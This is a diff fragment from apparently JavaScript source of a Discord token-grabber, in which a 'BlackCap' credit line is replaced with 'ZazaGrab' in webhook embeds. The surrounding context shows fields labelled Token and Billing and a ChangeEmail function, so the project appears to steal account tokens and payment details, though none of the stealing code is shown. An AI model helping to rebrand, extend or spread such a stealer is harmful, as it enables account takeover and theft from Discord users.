@@ -343,7 +343,7 @@ async function FirstTime() {
                                 inline: !0
 								}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
+                                value: `[ZazaGrab 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                                 inline: !0
 								}, {
                                 name: "<a:tokens:1041634540537511957> Token",
@@ -454,7 +454,7 @@ async function FirstTime() {
                                         inline: !0
 								}, {
                                         name: "@Copyright",
-                                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
+                                        value: `[ZazaGrab 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                                         inline: !0
 								}, {
                                         name: "<a:tokens:1041634540537511957> Token",
@@ -1213,7 +1213,7 @@ async function ChangeEmail(newemail, password, token) {
                                 inline: !0
 					}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                value: `[ZazaGrab 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                                 inline: !0
 					}, {
                                 name: "Billing <a:billing:1041641103629234196>",
